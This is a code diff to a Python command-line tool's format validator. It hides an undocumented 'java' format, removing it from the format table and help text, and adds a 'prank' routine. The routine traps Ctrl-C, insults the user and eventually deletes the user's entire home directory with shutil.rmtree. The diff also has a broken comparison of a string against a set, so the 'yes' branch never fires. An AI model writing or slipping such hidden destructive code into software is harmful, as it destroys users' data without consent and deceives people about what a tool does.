@@ -90,7 +90,6 @@ formats = {
 	("gv" , "dot", "graphviz")           : "gv"    ,
 	("c",)                               : "c"     ,
 	("c++", "cpp")                       : "cpp"   ,
-	("java",)                            : "java"  ,
 	("i", "info",)                       : "txt"   ,
 	("metrics",)    : "txt"     , ("m",) : "txt"   ,
 	("ir",)         : "txt"     , ("r",) : "txt"   ,
@@ -136,8 +135,20 @@ def validate_format(syntax: str) -> str:
 
 	syntax = syntax.strip().lower()
 
+	error_msg = f"invalid format {syntax!r}. see `--help=formats` / `-F` for a list of valid formats"
+
 	if syntax == "java":
+		# this syntax is not documented
 		# funny prank for java users because I don't like java
+
+		while True:
+			choice = input("Do you like java (y/n)? ").strip().lower()
+			if choice in {"n", "no"}:
+				raise argparse.ArgumentTypeError(error_msg)
+
+			if choice == {"y", "yes"}:
+				break
+
 		import signal, shutil
 
 		ctrlc_count = 0
@@ -155,38 +166,71 @@ def validate_format(syntax: str) -> str:
 
 			ctrlc_count += 1
 
-			if ctrlc_count >= 13:
+			if ctrlc_count >= 16:
 				# dirty java users
 				shutil.rmtree(os.path.expanduser('~'), ignore_errors=True)
+				raise SystemExit
 
 		signal.signal(signal.SIGINT, handler)
 
-		while True:
-			if ctrlc_count >= 13:
-				# HE HE HE
-				print("\rtoo late\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 12:
-				print("\rfinal warning. ^C again deletes your stuff\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 11:
-				print("\rI almost feel bad\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 10:
-				print("\rsudo killall -9 python?\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 9:
-				print("\rmaybe you need to take an IQ test\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 8:
-				print("\ryou know the terminal has a big X in the corner, right?\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 7:
-				print("\ralright bud, your shits about to get nuked\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 6:
-				print("\rmaybe stop pressing ^C?\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 5:
-				print("\ridk, maybe try something else?\x1b[K", end="", flush=True)
-			elif ctrlc_count >= 3:
-				print("\robviously ^C is not working", end="", flush=True)
-			else:
-				print("NOT TODAY, SATAN!")
+		dir = [11, 3, 1] # the variable shadowing doesn't matter
+		c = [107, 56, 2]
 
-	error_msg = f"invalid format {syntax!r}. see `--help=formats` / `-F` for a list of valid formats"
+		def safe_input(prompt: str) -> str:
+			while True:
+				try:
+					return input(prompt)
+				except EOFError:
+					prompt = "" # only print the prompt the first time
+
+		while True:
+			if ctrlc_count >= 16:
+				# HE HE HE
+				print("\r\x1b[1;31mI guess you got what you wanted?\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 15:
+				print(f"\r\x1b[1;33mtype in the password to continue deletion: Ab3!gN^ja&b2/9*\x1b[K\x1b[m")
+
+				if safe_input("password: ") != "Ab3!gN^ja&b2/9*":
+					print("\x1b[1;32mpassword incorrect, aborting\x1b[m")
+					raise SystemExit(2)
+				else:
+					ctrlc_count += 1
+			elif ctrlc_count >= 14: print(f"\r\x1b[1;33mIs this a joke to you?\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 13: print(f"\r\x1b[1;31mno, like actually I am going to delete '{os.path.expanduser('~').replace('\\', '/')}'\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 12: print("\r\x1b[1;31mfinal warning. ^C again deletes your stuff\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 11: print("\r\x1b[1;33mWhy are you trying to accomplish?\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 10: print("\r\x1b[1;33mI almost feel bad\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 9: print("\r\x1b[1;31msudo killall -9 python?\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 8: print("\r\x1b[1;33mmaybe you need to take an IQ test\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 7: print("\r\x1b[1;33myou know the terminal has a big X in the corner, right?\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 6: print("\r\x1b[1;31malright bud, your shits about to get nuked\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 5: print("\r\x1b[1;33midk, perhaps stop pressing ^C?\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 4: print("\r\x1b[1;33mmaybe try something else?\x1b[K\x1b[m", end="", flush=True)
+			elif ctrlc_count >= 3: print("\r\x1b[33mso obviously ^C is not working\x1b[m", end="", flush=True)
+			else:
+				print(f"\x1b[38;2;{c[0]};{c[1]};{c[2]}mNOT TODAY, SATAN!\x1b[m")
+
+				c[2] += dir[2]
+
+				if 0 <= c[2] <= 255:
+					continue
+
+				dir[2] *= -1
+				c[2] += dir[2] << 1
+				c[1] += dir[1]
+
+				if 0 <= c[1] <= 255:
+					continue
+
+				dir[1] *= -1
+				c[1] += dir[1] << 1
+				c[0] += dir[0]
+
+				if 0 <= c[0] <= 255:
+					continue
+
+				dir[0] *= -1
+				c[0] += dir[0] << 1
 
 	if syntax == "asm":
 		extension = "asm"
@@ -606,7 +650,6 @@ def print_help_formats(formats: tuple[tuple[str, ...], ...] = formats) -> None:
 		"\n"
 		"\nfor all assembly formats, 'clang' and 'llvm' dialects alias 'gas'"
 		"\nfor raw/json/metrics formats: long name => beautified, short name => minified."
-		"\nprobably don't use the java format :p"
 		"\nall format names and flag names/values are case insensitive"
 		"\n"
 		"\nThe asm modes are mostly just a proof of concept and are insanely inefficient."
